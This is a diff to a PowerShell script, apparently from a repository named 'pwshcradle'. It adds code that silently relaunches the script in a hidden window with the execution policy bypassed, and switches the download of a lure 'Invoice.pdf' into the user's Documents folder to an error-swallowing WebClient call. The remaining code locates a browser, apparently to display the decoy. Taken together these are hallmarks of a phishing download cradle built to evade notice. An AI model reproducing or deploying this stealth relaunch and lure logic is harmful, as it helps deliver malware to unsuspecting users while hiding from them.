@@ -1,3 +1,12 @@
+if (-not $env:RELAUNCHED) {
+    $env:RELAUNCHED = "1"
+    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NonInteractive -File `"$PSCommandPath`"" -ErrorAction SilentlyContinue
+    exit
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$wc = New-Object System.Net.WebClient
+
 $pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
 $pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"
 
@@ -19,7 +28,7 @@ $browserProcessNames = @(
     "firefox"
 )
 
-Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue
+try { $wc.DownloadFile($pdfUrl, $pdfPath) } catch {}
 
 $browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
 
